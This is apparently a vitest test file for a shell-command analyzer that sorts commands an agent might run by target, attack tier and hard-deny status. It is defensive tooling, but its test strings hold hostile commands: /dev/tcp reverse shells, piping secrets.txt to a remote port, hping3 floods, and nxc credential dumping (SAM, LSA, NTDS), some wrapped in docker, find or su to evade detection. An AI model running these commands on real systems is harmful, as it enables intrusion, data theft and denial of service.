import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import {
  type CommandAnalysis,
  createTargetExtractor,
  type ExtractedTarget,
} from '../../src/extract/extractor.js'
import { sweepLiterals } from '../../src/extract/literals.js'
import type { OpaqueKind } from '../../src/extract/tokenizer.js'
import { KNOWN_TOOLS, type KnownToolSpec } from '../../src/extract/tools-table.js'

const CWD = join(import.meta.dirname, '..', 'fixtures', 'commands', 'cwd')
const extractor = createTargetExtractor()
const analyze = (command: string) => extractor.analyze(command, { cwd: CWD, shell: 'posix' })

/** Every segment, nested commands included. */
function allSegments(a: CommandAnalysis): CommandAnalysis['segments'] {
  return a.segments.flatMap((s) => [s, ...(s.nested ? allSegments(s.nested) : [])])
}

interface Row {
  cmd: string
  network?: boolean
  /** raw → expectations; every listed raw must be present. */
  targets?: Record<string, Partial<Pick<ExtractedTarget, 'inert' | 'role' | 'provenance'>>>
  /** raws that must NOT be reported. */
  absent?: string[]
  opaque?: OpaqueKind[]
  noOpaque?: OpaqueKind[]
  tiers?: string[]
  /** tiers that must NOT appear. */
  noTiers?: string[]
  /** category of the first segment. */
  category?: string | null
  hardDeny?: boolean
  intrusive?: boolean
  credentials?: boolean
  rate?: Record<string, number>
}

async function check(row: Row): Promise<void> {
  const a = await analyze(row.cmd)
  const segs = allSegments(a)
  if (row.network !== undefined) expect(a.knownNetwork, 'knownNetwork').toBe(row.network)
  for (const [raw, exp] of Object.entries(row.targets ?? {})) {
    const t = a.targets.find((x) => x.raw === raw)
    expect(t, `target ${raw} in ${a.targets.map((x) => x.raw).join(' ')}`).toBeDefined()
    expect(t).toMatchObject(exp)
  }
  for (const raw of row.absent ?? []) {
    expect(
      a.targets.map((t) => t.raw),
      `absent ${raw}`,
    ).not.toContain(raw)
  }
  for (const k of row.opaque ?? []) expect(a.opaque, `opaque ${k}`).toContain(k)
  for (const k of row.noOpaque ?? []) expect(a.opaque, `no opaque ${k}`).not.toContain(k)
  if (row.tiers) expect(a.tiers, 'tiers').toEqual(expect.arrayContaining(row.tiers))
  for (const t of row.noTiers ?? []) expect(a.tiers, `no tier ${t}`).not.toContain(t)
  if (row.category !== undefined) expect(a.segments[0]?.category, 'category').toBe(row.category)
  if (row.hardDeny !== undefined) expect(a.hardDeny !== null, 'hardDeny').toBe(row.hardDeny)
  if (row.intrusive !== undefined) {
    expect(
      segs.some((s) => s.intrusive),
      'intrusive',
    ).toBe(row.intrusive)
  }
  if (row.credentials !== undefined) {
    expect(
      segs.some((s) => s.credentials),
      'credentials',
    ).toBe(row.credentials)
  }
  for (const [field, value] of Object.entries(row.rate ?? {})) {
    const got = segs.map((s) => (s.rate as unknown as Record<string, number | undefined>)[field])
    expect(got, `rate.${field}`).toContain(value)
  }
}

const T = '203.0.113.5'
const live = { inert: false }

const table = (rows: Row[]) =>
  it.each(rows.map((r) => [r.cmd, r] as const))('%s', async (_cmd, row) => check(row))

describe('fix round 1: nonNetworkFlags are top-level only and never a kill switch', () => {
  table([
    { cmd: `docker run -v /tmp:/data img nmap ${T}`, network: true, targets: { [T]: live } },
    {
      cmd: 'gem install rails -v 7.0.0 --source https://evil.example/',
      network: true,
      targets: { 'https://evil.example/': live },
    },
    {
      cmd: 'cargo install --version 14.0.0 ripgrep --index https://x/',
      network: true,
      targets: { 'https://x/': live },
    },
    {
      cmd: 'choco install nmap --version 7.9 -s https://x/',
      network: true,
      targets: { 'https://x/': live },
    },
    { cmd: 'winget install --version 1.2 X', network: true },
    { cmd: `ssh admin@${T} grep -G x /var/log/syslog`, network: true, targets: { [T]: live } },
    { cmd: `curl -version https://${T}/`, network: true, targets: { [`https://${T}/`]: live } },
    { cmd: `smbmap -H ${T} -v`, network: true, targets: { [T]: live } },
    { cmd: `ldapsearch -V -x -H ldap://${T}`, network: true, targets: { [`ldap://${T}`]: live } },
    { cmd: 'ldapsearch -VV', network: false },
    { cmd: 'nmap --version', network: false },
    { cmd: `nmap --version ${T}`, network: true, targets: { [T]: live } },
  ])

  it('no spec lists a non-network or non-target flag as a target, file, infra or embedded flag', () => {
    const collide = (s: Partial<KnownToolSpec>, name: string): string[] => {
      const targetish = new Set([
        ...(s.hostFlags ?? []),
        ...(s.urlFlags ?? []),
        ...(s.fileFlags ?? []),
        ...(s.urlOrFileFlags ?? []),
        ...(s.infraFlags ?? []),
        ...(s.embeddedFlags ?? []).map((e) => e.flag),
      ])
      const hits = [...(s.nonNetworkFlags ?? []), ...(s.nonTargetFlags ?? [])].filter((f) =>
        targetish.has(f),
      )
      const subs = Object.entries(s.subcommands ?? {}).flatMap(([k, v]) =>
        collide(v, `${name} ${k}`),
      )
      return [...hits.map((h) => `${name} ${h}`), ...subs]
    }
    expect(KNOWN_TOOLS.flatMap((s) => collide(s, s.names[0] ?? ''))).toEqual([])
  })
})

describe('fix round 1: /dev/tcp, /dev/udp and gawk /inet', () => {
  table([
    {
      cmd: `bash -i >& /dev/tcp/${T}/4444 0>&1`,
      network: true,
      targets: { [`${T}:4444`]: live },
    },
    { cmd: `exec 3<>/dev/udp/${T}/53`, network: true, targets: { [`${T}:53`]: live } },
    { cmd: `cat < /dev/tcp/${T}/80`, network: true, targets: { [`${T}:80`]: live } },
    {
      cmd: `cat secrets.txt > /dev/tcp/${T}/9001`,
      network: true,
      targets: { [`${T}:9001`]: live },
    },
    {
      cmd: `gawk "BEGIN { getline line < \\"/inet4/tcp/0/${T}/80\\" }"`,
      network: true,
      targets: { [`${T}:80`]: live },
    },
    {
      cmd: `bash -c 'echo hi > /dev/tcp/${T}/8080'`,
      network: true,
      targets: { [`${T}:8080`]: live },
    },
  ])
})

describe('fix round 1: $ inside tokens', () => {
  table([
    {
      cmd: `python3 -c 'print("$") or urlopen("http://${T}/")'`,
      targets: { [`http://${T}/`]: live },
    },
    { cmd: `./tool --target=$HOST.acme.example ${T}`, targets: { [T]: live } },
  ])

  it('strips $NAME and ${…} but sweeps the remainder', () => {
    expect(sweepLiterals([`a=$X;b=${T}`]).map((h) => h.raw)).toEqual([T])
    expect(sweepLiterals(['${T}.acme.example', '$HOST']).map((h) => h.raw)).toEqual([])
  })
})

describe('fix round 1: wrappers and special forms (P18)', () => {
  const flood = `hping3 --flood ${T}`
  table([
    { cmd: `watch -n1 ${flood}`, hardDeny: true, tiers: ['dos'] },
    { cmd: `watch -n 1 "${flood}"`, hardDeny: true },
    { cmd: `find . -exec ${flood} ;`, hardDeny: true, tiers: ['dos'] },
    { cmd: `find /tmp -name x -execdir ${flood} +`, hardDeny: true },
    { cmd: `env - ${flood}`, hardDeny: true },
    { cmd: `env -i ${flood}`, hardDeny: true },
    { cmd: `setsid -f ${flood}`, hardDeny: true },
    { cmd: `docker run --rm img ${flood}`, hardDeny: true, tiers: ['dos'] },
    {
      cmd: `docker run --rm -it -e A=1 --name x -p 80:80 img nmap -T5 ${T}`,
      network: true,
      targets: { [T]: live },
      rate: { nmapTiming: 5 },
    },
    { cmd: `podman exec -u root box ${flood}`, hardDeny: true },
    { cmd: `su -c '${flood}' root`, hardDeny: true },
    { cmd: `su root --command="${flood}"`, hardDeny: true },
    { cmd: `script -q -c "${flood}" /dev/null`, hardDeny: true },
    { cmd: 'command -v nmap', network: false },
    { cmd: 'command -V curl', network: false },
    { cmd: `command nmap ${T}`, network: true, targets: { [T]: live } },
  ])
})

describe('fix round 1: unknown subcommands of tier-null tools are not inert (P18)', () => {
  table([
    {
      cmd: 'git send-email --smtp-server 198.51.100.9 x.patch',
      network: true,
      category: 'vcs',
      targets: { '198.51.100.9': live },
    },
    { cmd: 'amass intel -addr 198.51.100.1-50', targets: { '198.51.100.1-50': live } },
    {
      cmd: 'git svn clone https://svn.acme.example/repo',
      targets: { 'https://svn.acme.example/repo': live },
    },
    { cmd: 'git daemon --listen=198.51.100.9', targets: { '198.51.100.9': live } },
    {
      cmd: 'svn diff https://svn.acme.example/a https://svn.acme.example/b',
      targets: { 'https://svn.acme.example/a': live },
    },
    { cmd: 'git commit -m "block 203.0.113.5"', network: false, targets: { [T]: { inert: true } } },
    { cmd: 'git status', network: false },
    { cmd: 'npm run build', network: false },
  ])

  it('treats an unknown subcommand of a non-vcs/package tool like an unknown program', async () => {
    const a = await analyze('amass intel -addr 198.51.100.1-50')
    expect(a.segments[0]).toMatchObject({ tool: null, category: null })
  })
})

describe('addendum: unknown vcs/package subcommands stay network (P15)', () => {
  table([
    { cmd: 'git remote update', network: true, category: 'vcs' },
    { cmd: 'npm frobnicate', network: true, category: 'package-manager' },
    { cmd: 'git status', network: false, category: 'vcs' },
  ])

  it('reports no targets for git remote update', async () => {
    expect((await analyze('git remote update')).targets).toEqual([])
  })
})

describe('addendum: interactive /dev/tcp shells are post-exploitation (P20)', () => {
  table([
    { cmd: `bash -i >& /dev/tcp/${T}/4444 0>&1`, tiers: ['post-exploitation'] },
    { cmd: `sh >& /dev/tcp/${T}/4444 0>&1`, tiers: ['post-exploitation'] },
    { cmd: `bash < /dev/tcp/${T}/4444`, tiers: ['post-exploitation'] },
    {
      cmd: `exec 5<>/dev/tcp/${T}/4444; cat <&5 | while read l; do $l 2>&5 >&5; done`,
      tiers: ['post-exploitation'],
      opaque: ['variable'],
    },
    { cmd: `exec 5<>/dev/tcp/${T}/4444; cat <&5 | sh`, tiers: ['post-exploitation'] },
    {
      cmd: `0<&196;exec 196<>/dev/tcp/${T}/4444; sh <&196 >&196 2>&196`,
      tiers: ['post-exploitation'],
    },
    { cmd: `echo > /dev/tcp/${T}/80`, tiers: ['recon'], noTiers: ['post-exploitation'] },
    {
      cmd: `timeout 1 bash -c '</dev/tcp/${T}/22'`,
      tiers: ['recon'],
      noTiers: ['post-exploitation'],
    },
    {
      cmd: `exec 3<>/dev/tcp/${T}/80; echo -e "GET / HTTP/1.0" >&3; cat <&3`,
      tiers: ['recon'],
      noTiers: ['post-exploitation'],
    },
  ])
})

describe('fix round 1: rates', () => {
  table([
    { cmd: `nmap --min-rate 1e6 ${T}`, rate: { pps: 1e6 }, noOpaque: ['unparseable-rate'] },
    { cmd: `nmap --max-rate fast ${T}`, opaque: ['unparseable-rate'] },
    { cmd: `nmap -T9 ${T}`, opaque: ['unparseable-rate'] },
    { cmd: `hping3 -i u100 ${T}`, rate: { pps: 10000 } },
    { cmd: `hping3 --fast ${T}`, rate: { pps: 100 } },
    { cmd: `hping3 --faster ${T}`, rate: { pps: 1000 } },
    { cmd: 'zmap -B 10M -p 80 203.0.113.0/24', rate: { pps: 10_000_000 / 512 } },
    { cmd: 'masscan 203.0.113.0/24 -p80 --max-rate 100000', rate: { pps: 100000 } },
    {
      cmd: `rustscan -a ${T} -- -T5 --script vuln`,
      network: true,
      tiers: ['vuln-scan'],
      intrusive: true,
      rate: { nmapTiming: 5 },
    },
  ])
})

describe('fix round 1: nmap --script allowlist', () => {
  table([
    { cmd: `nmap --script http-shellshock ${T}`, tiers: ['vuln-scan'], intrusive: true },
    { cmd: `nmap --script all ${T}`, tiers: ['vuln-scan'], intrusive: true },
    { cmd: `nmap --script "*" ${T}`, tiers: ['vuln-scan'], intrusive: true },
    { cmd: `nmap --script "not safe" ${T}`, tiers: ['vuln-scan'], intrusive: true },
    { cmd: `nmap --script fuzzer,external ${T}`, tiers: ['vuln-scan'], intrusive: true },
    { cmd: `nmap --script ./custom.nse ${T}`, tiers: ['vuln-scan'], intrusive: true },
    { cmd: `nmap --script default,safe ${T}`, tiers: ['recon'], intrusive: false },
    { cmd: `nmap --script=discovery,version ${T}`, tiers: ['recon'], intrusive: false },
    { cmd: `nmap -sC ${T}`, tiers: ['recon'], intrusive: false },
    { cmd: `nmap --script ssh-brute ${T}`, tiers: ['bruteforce'] },
    { cmd: `nmap --script dos ${T}`, tiers: ['dos'] },
    { cmd: `nmap --script exploit ${T}`, tiers: ['exploitation'] },
  ])
})

describe('fix round 1: nxc / crackmapexec', () => {
  const base = `nxc smb ${T} -u admin -p pw`
  table([
    { cmd: `${base} --sam`, tiers: ['post-exploitation'] },
    {
      cmd: `${base} --sam secdump`,
      tiers: ['post-exploitation'],
      absent: ['secdump'],
      noOpaque: ['unparseable-target'],
    },
    { cmd: `${base} --lsa`, tiers: ['post-exploitation'] },
    { cmd: `${base} --ntds vss`, tiers: ['post-exploitation'], noOpaque: ['unparseable-target'] },
    { cmd: `${base} --dpapi`, tiers: ['post-exploitation'] },
    {
      cmd: `${base} -M lsassy -o COMMAND=x`,
      tiers: ['post-exploitation'],
      noOpaque: ['unparseable-target'],
    },
    { cmd: `nxc smb ${T} -u users.txt -p Winter2026`, tiers: ['bruteforce'] },
    { cmd: `crackmapexec smb ${T} -u admin -p passwords.lst`, tiers: ['bruteforce'] },
    { cmd: `${base} --port 4455`, targets: { [T]: live }, noOpaque: ['unparseable-target'] },
  ])
})

describe('fix round 1: embedded destinations', () => {
  table([
    {
      cmd: `curl --resolve acme.example:443:${T} https://acme.example/`,
      targets: { [T]: { inert: false, role: 'target' }, 'https://acme.example/': live },
    },
    {
      cmd: 'curl --connect-to acme.example:443:203.0.113.9:443 https://acme.example/',
      targets: { '203.0.113.9:443': { role: 'target' } },
    },
    {
      cmd: `ssh -L 8080:198.51.100.20:80 user@${T}`,
      targets: { '198.51.100.20:80': { role: 'target' }, [T]: live },
    },
    {
      cmd: `ssh -L 127.0.0.1:8080:198.51.100.20:80 user@${T}`,
      targets: { '198.51.100.20:80': { role: 'target' }, '127.0.0.1': { role: 'infra' } },
    },
    {
      cmd: `ssh -R 9000:198.51.100.21:22 user@${T}`,
      targets: { '198.51.100.21:22': { role: 'target' } },
    },
    { cmd: `ssh -D 198.51.100.30:1080 user@${T}`, targets: { '198.51.100.30': { role: 'infra' } } },
    {
      cmd: `ssh -J jump1.acme.example,ops@jump2.acme.example:2222 user@${T}`,
      targets: {
        'jump1.acme.example': { role: 'target' },
        'jump2.acme.example:2222': { role: 'target' },
      },
    },
    {
      cmd: 'ssh -W 198.51.100.40:22 jump.acme.example',
      targets: { '198.51.100.40:22': { role: 'target' } },
    },
  ])
})

describe('fix round 1: target-file reader', () => {
  table([
    { cmd: 'nmap -iL .', opaque: ['unreadable-target-file'] },
    { cmd: 'nmap -iL /dev/zero', opaque: ['unreadable-target-file'] },
  ])

  it.skipIf(process.platform === 'win32')('refuses /proc files', async () => {
    const a = await analyze('nmap -iL /proc/self/environ')
    expect(a.opaque).toContain('unreadable-target-file')
    expect(a.targets).toEqual([])
  })
})

describe('fix round 1: unknown programs, roles, cookies, table fixes', () => {
  table([
    { cmd: 'mytool -h198.51.100.9', targets: { '198.51.100.9': live } },
    {
      cmd: `nmap --dns-servers 1.1.1.1 -D 198.51.100.8 ${T}`,
      targets: {
        '1.1.1.1': { role: 'infra' },
        '198.51.100.8': { role: 'target' },
        [T]: { role: 'target' },
      },
    },
    {
      cmd: 'curl -x http://198.51.100.7:3128 https://acme.example/',
      targets: {
        'http://198.51.100.7:3128': { role: 'infra' },
        'https://acme.example/': { role: 'target' },
      },
    },
    {
      cmd: "curl -e https://ref.acme.example/ -A 'agent 1.2.3.4' -d 'host=198.51.100.9' -o out.acme.example https://acme.example/",
      targets: { 'https://acme.example/': live },
      absent: ['https://ref.acme.example/', '198.51.100.9', 'out.acme.example', '1.2.3.4'],
    },
    { cmd: "curl -b 'session=abc' https://acme.example/", credentials: true },
    { cmd: "curl -H 'Cookie: s=1' https://acme.example/", credentials: true },
    { cmd: 'curl -c jar.txt https://acme.example/', credentials: false },
    { cmd: 'wget --load-cookies c.txt https://acme.example/', credentials: true },
    { cmd: 'wget --save-cookies c.txt https://acme.example/', credentials: false },
    { cmd: 'sqlmap -u https://acme.example/?id=1 --cookie "PHPSESSID=x"', credentials: true },
    { cmd: `nikto -h ${T}`, targets: { [T]: { provenance: 'flag' } } },
    {
      cmd: 'katana -list https://acme.example/',
      targets: { 'https://acme.example/': { provenance: 'flag' } },
    },
    { cmd: 'katana -list targets-in.txt', targets: { 'www.acme.example': { provenance: 'file' } } },
    {
      cmd: `evil-winrm -i ${T} -U /wsman -u a -p b`,
      targets: { [T]: live },
      noOpaque: ['unparseable-target'],
    },
    {
      cmd: `nmap --stats-every 10s --max-os-tries 1 --servicedb s.db --versiondb v.db ${T}`,
      targets: { [T]: live },
      noOpaque: ['unparseable-target'],
    },
    {
      cmd: 'nuclei -targets-inline "acme.example 203.0.113.5" -llm-base-url http://198.51.100.3:8080/v1',
      targets: {
        'acme.example': { provenance: 'flag' },
        'http://198.51.100.3:8080/v1': { role: 'infra' },
      },
    },
  ])

  it('ignores .patch files in the sweep', () => {
    expect(sweepLiterals(['0001-fix.acme.patch', 'acme.patch']).map((h) => h.raw)).toEqual([])
  })
})

describe('fix round 2: still fail-open after round 1', () => {
  const deny = 'nmap -iR 10'
  table([
    { cmd: `find . -exec true {} + -exec ${deny} {} +`, hardDeny: true },
    { cmd: `find . -name x -ok echo {} ; -execdir ${deny} {} +`, hardDeny: true },
    {
      cmd: `docker run --pod p img ${deny}`,
      hardDeny: true,
      noOpaque: ['nested-command-unresolved'],
    },
    { cmd: `docker run --detach-keys ctrl-x img ${deny}`, hardDeny: true },
    {
      cmd: 'docker run --rm instrumentisto/nmap -iR 10',
      hardDeny: true,
      opaque: ['nested-command-unresolved'],
    },
    {
      cmd: `docker run --frobnicate x img ${deny}`,
      hardDeny: true,
      opaque: ['nested-command-unresolved'],
    },
    {
      cmd: `podman run --pod-id-file f --http-proxy=false --shm-size 1g img ${deny}`,
      hardDeny: true,
      noOpaque: ['nested-command-unresolved'],
    },
    {
      cmd: `docker -H tcp://${T}:2375 ps`,
      network: true,
      targets: { [`tcp://${T}:2375`]: live },
    },
    {
      cmd: `docker -H ssh://user@${T} images`,
      network: true,
      targets: { [`ssh://user@${T}`]: live },
    },
    {
      cmd: `bash -i >& /dev/tcp/${T}/https 0>&1`,
      tiers: ['post-exploitation'],
      targets: { [`${T}:443`]: live },
    },
    {
      cmd: 'bash -i >& /dev/tcp/$H/4444 0>&1',
      network: true,
      tiers: ['post-exploitation'],
      opaque: ['unparseable-target', 'variable'],
    },
  ])
})

describe('fix round 2: P23 environment assignments and container registries', () => {
  table([
    {
      cmd: `DOCKER_HOST=tcp://${T}:2375 docker ps`,
      network: true,
      targets: { [`tcp://${T}:2375`]: live },
    },
    {
      cmd: `env HTTPS_PROXY=http://198.51.100.7:3128 git status`,
      targets: { 'http://198.51.100.7:3128': live },
    },
    {
      cmd: 'docker pull registry.acme.example/x/y:1',
      network: true,
      category: 'package-manager',
      targets: { 'registry.acme.example': live },
    },
    {
      cmd: `docker run --rm ${T}:5000/img echo hi`,
      network: true,
      targets: { [`${T}:5000`]: live },
    },
    { cmd: 'docker pull nginx', network: true, category: 'package-manager' },
    {
      cmd: 'podman create --name x localhost:5000/img',
      network: true,
      targets: { 'localhost:5000': live },
    },
    { cmd: 'docker build -t x .', network: true },
    { cmd: 'docker ps', network: false },
  ])
})

describe('fix round 2: minors', () => {
  table([
    { cmd: `runuser -u x -- ${deny2()}`, hardDeny: true },
    { cmd: `runuser -l x -c '${deny2()}'`, hardDeny: true },
    {
      cmd: 'curl --user-agent=198.51.100.9 -A 198.51.100.10 https://acme.example/',
      absent: ['198.51.100.9', '198.51.100.10'],
      targets: { 'https://acme.example/': live },
    },
    {
      cmd: `nmap --exclude ${T} ${T}`,
      targets: { [T]: { provenance: 'positional' } },
    },
    {
      cmd: `zmap -S 198.51.100.4 -p 80 203.0.113.0/24`,
      targets: { '198.51.100.4': { role: 'target' } },
    },
    {
      cmd: `masscan --source-ip 198.51.100.4 --adapter-ip 198.51.100.5 -p80 203.0.113.0/24`,
      targets: { '198.51.100.4': { role: 'target' }, '198.51.100.5': { role: 'target' } },
    },
    {
      cmd: 'curl --interface 198.51.100.6 https://acme.example/',
      targets: { '198.51.100.6': { role: 'infra' } },
    },
    {
      cmd: 'git -c http.proxy=http://198.51.100.7:3128 clone https://github.com/x/y',
      targets: {
        'http://198.51.100.7:3128': { role: 'infra' },
        'https://github.com/x/y': { role: 'target' },
      },
    },
    { cmd: 'curl ${X:-203.0.113.5}', opaque: ['variable'], targets: { [T]: live } },
  ])

  it('keeps the default literal of ${X:-…} when blanking the variable', () => {
    expect(sweepLiterals(['${X:-203.0.113.5}', '${Y:=acme.example}']).map((h) => h.raw)).toEqual([
      T,
      'acme.example',
    ])
  })
})

function deny2(): string {
  return 'nmap -iR 10'
}

describe('fix round 3: find terminators, podman gaps, runuser, compose', () => {
  table([
    { cmd: 'find . -exec nmap + -iR 10 {} \;', hardDeny: true },
    {
      cmd: `find . -exec echo {} \; -exec hping3 + --flood ${T} {} \;`,
      hardDeny: true,
      tiers: ['dos'],
    },
    { cmd: 'find . -exec true {} \; \( -name x -exec nmap -iR 10 {} \; \)', hardDeny: true },
    { cmd: 'find . -exec true {} \; , -exec nmap -iR 10 {} +', hardDeny: true },
    {
      cmd: 'podman run --creds u:p img nmap -iR 10',
      hardDeny: true,
      noOpaque: ['nested-command-unresolved'],
    },
    {
      cmd: 'podman --db-backend sqlite run img nmap -iR 10',
      hardDeny: true,
      opaque: ['nested-command-unresolved'],
    },
    {
      cmd: 'podman --network-cmd-path /usr/bin/x run img nmap -iR 10',
      hardDeny: true,
      opaque: ['nested-command-unresolved'],
    },
    { cmd: 'podman --frob x y nmap -iR 10', hardDeny: true, opaque: ['nested-command-unresolved'] },
    { cmd: `podman exec -l hping3 ${T} --flood`, hardDeny: true, tiers: ['dos'] },
    {
      cmd: `podman exec --latest nmap ${T}`,
      network: true,
      targets: { [T]: { provenance: 'positional' } },
    },
    { cmd: 'runuser -u x -g wheel -- nmap -iR 10', hardDeny: true },
    { cmd: 'runuser -u x -g wheel nmap -iR 10', hardDeny: true },
    { cmd: 'runuser -u x -w PATH -- nmap -iR 10', hardDeny: true },
    { cmd: 'runuser -u x --frob y nmap -iR 10', opaque: ['nested-command-unresolved'] },
    {
      cmd: `docker run --entrypoint nmap img ${T}`,
      network: true,
      absent: ['img'],
      targets: { [T]: { provenance: 'positional' } },
      noOpaque: ['nested-command-unresolved', 'unparseable-target'],
    },
    { cmd: 'docker compose run web nmap -iR 10', hardDeny: true },
    { cmd: 'docker compose -f c.yml run --rm -e A=1 -u root web nmap -iR 10', hardDeny: true },
    { cmd: `docker-compose exec -T --index 2 web hping3 --flood ${T}`, hardDeny: true },
    { cmd: 'podman-compose run web nmap -iR 10', hardDeny: true },
    {
      cmd: 'docker compose run --frob x web nmap -iR 10',
      hardDeny: true,
      opaque: ['nested-command-unresolved'],
    },
  ])
})

describe('fix round 4: pull after unknown globals, exec -l clusters/values, find-guard scope, runuser -c forms, compose --no-TTY', () => {
  table([
    // 1. An undocumented GLOBAL option whose value is `pull` dropped the opaque marker and the
    //    swept nested argv (the `if (sub === 'pull') return form` early return).
    {
      cmd: 'podman --network-cmd-path pull run alpine nmap -iR 10',
      hardDeny: true,
      opaque: ['nested-command-unresolved'],
    },
    {
      cmd: 'docker --frob pull run alpine nmap -iR 10',
      hardDeny: true,
      opaque: ['nested-command-unresolved'],
    },
    // 2. `exec -l/--latest` must be read from the cluster letters and never from an option value.
    { cmd: `podman exec -il hping3 ${T} --flood`, hardDeny: true, tiers: ['dos'] },
    {
      cmd: `podman exec -e -l ctr nmap -iR 10`,
      hardDeny: true,
      noOpaque: ['nested-command-unresolved'],
    },
    // 2b. pflag booleans: `--latest=false|0` keeps the container argument; an unknown value fails
    //     closed; `--latest=true` still selects the latest container.
    {
      cmd: `podman exec --latest=false ctr nmap -iR 10`,
      hardDeny: true,
      noOpaque: ['nested-command-unresolved'],
    },
    { cmd: `podman exec --latest=0 ctr hping3 ${T} --flood`, hardDeny: true, tiers: ['dos'] },
    {
      cmd: `podman exec --latest=maybe ctr nmap -iR 10`,
      hardDeny: true,
      opaque: ['nested-command-unresolved'],
    },
    { cmd: `podman exec --latest=true nmap -iR 10`, hardDeny: true },
    // 2c. runuser getopt permutes words seen BEFORE `-u` into the command.
    { cmd: `runuser nmap -u x -- -iR 10`, hardDeny: true },
    { cmd: `runuser hping3 -u x -- --flood ${T}`, hardDeny: true, tiers: ['dos'] },
    // 3. A stray `-exec` word must not hijack su/script/runuser/compose into the find branch.
    { cmd: `su -c 'nmap -iR 10' x -- -exec`, hardDeny: true },
    { cmd: `script -c 'nmap -iR 10' -- -exec`, hardDeny: true },
    { cmd: `runuser -u x -- hping3 --flood ${T} -exec`, hardDeny: true, tiers: ['dos'] },
    { cmd: `docker-compose exec web hping3 --flood ${T} -exec`, hardDeny: true },
    { cmd: `podman-compose run web sh -c 'nmap -iR 10' -exec`, hardDeny: true },
    // 4. runuser getopt permutes: `-c` after the user, or after `--`, still runs a command.
    { cmd: `runuser x -- -c 'nmap -iR 10'`, hardDeny: true },
    { cmd: `runuser -- x -c 'nmap -iR 10'`, hardDeny: true },
    { cmd: `runuser -l x -- -c 'nmap -iR 10'`, hardDeny: true },
    { cmd: `runuser x foo -c 'nmap -iR 10'`, hardDeny: true },
    // 5. Docker Compose spells the flag `--no-TTY`; accept both spellings.
    {
      cmd: `docker compose exec --no-TTY web hping3 --flood ${T}`,
      hardDeny: true,
      noOpaque: ['nested-command-unresolved'],
    },
    {
      cmd: 'docker compose run --no-TTY web nmap -iR 10',
      hardDeny: true,
      noOpaque: ['nested-command-unresolved'],
    },
  ])
})

describe('controller fix: a negated dos category is not the dos tier', () => {
  table([
    { cmd: `nmap --script "vuln and not dos" ${T}`, tiers: ['vuln-scan'], noTiers: ['dos'] },
    { cmd: `nmap --script "not dos and vuln" ${T}`, tiers: ['vuln-scan'], noTiers: ['dos'] },
    { cmd: `nmap --script http-slowloris-check ${T}`, noTiers: ['dos'] },
    { cmd: `nmap --script dos ${T}`, tiers: ['dos'] },
    { cmd: `nmap --script "vuln or dos" ${T}`, tiers: ['dos'] },
    { cmd: `nmap --script http-slowloris ${T}`, tiers: ['dos'] },
  ])
})
